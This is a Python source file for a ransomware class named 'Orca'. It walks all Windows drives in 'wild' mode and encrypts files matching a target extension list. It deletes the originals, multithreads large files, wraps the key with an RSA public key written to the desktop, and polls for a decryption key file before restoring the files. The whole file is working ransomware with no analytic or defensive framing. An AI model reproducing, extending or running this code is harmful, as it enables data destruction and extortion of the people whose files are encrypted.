import os
import time
import threading
import win32api
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


class Orca:
    def __init__(self,public_key=None,max_thread=150,env="sandbox",lroot=None,extension=None,egyptians=[]):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)
        self.public_key = public_key
        self.max_thread = max_thread
        self.paths = win32api.GetLogicalDriveStrings().split("\x00") if env == 'wild' else lroot
        self.desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
        self.extension = extension
        self.egyptians = egyptians

    def cipher(self,file_path,encrypted=False):
        def icipher():
            with open(file_path, 'rb') as f:
                data = f.read()
                if not encrypted:
                    file__path = file_path + self.extension
                    _data = self.crypter.encrypt(data)
                else:
                    file__path = '.'.join(file_path.split('.')[0:-1])
                    _data = self.crypter.decrypt(data)

            with open(file__path, 'wb') as fp:
                fp.write(_data)
            os.remove(file_path)

        return icipher

    def nomad(self,encrypted=False):
        for path in self.paths:
            system = os.walk(path, topdown=True)
            for (root, _, files) in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.exists(file_path):
                        file_size = os.stat(file_path).st_size
                        if not file.split('.')[-1] in self.egyptians:
                            continue
                        if not encrypted:
                            if file_size >= 30000000:
                                while True:
                                    if len(threading.enumerate()) < self.max_thread:
                                        t1 = self.cipher(file_path)
                                        threading.Thread(target=t1).start()
                                        break
                                    else:
                                        time.sleep(0.2)
                            else:
                                self.cipher(file_path)()
                        else:
                            self.cipher(file_path, encrypted=True)()

    def unlock(self):
        while True:
            try:
                with open(f'{self.desktop}/orca_decryption_key.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.nomad(encrypted=True)
                    break
            except Exception as e:
                pass
            time.sleep(10)
    
    def enc(self):
        pk = RSA.import_key(self.public_key)
        pc = PKCS1_OAEP.new(pk)
        enck = pc.encrypt(self.key)

        with open(f'{self.desktop}/orca_encryption_key.txt', 'wb') as f:
            f.write(enck)
        self.key = enck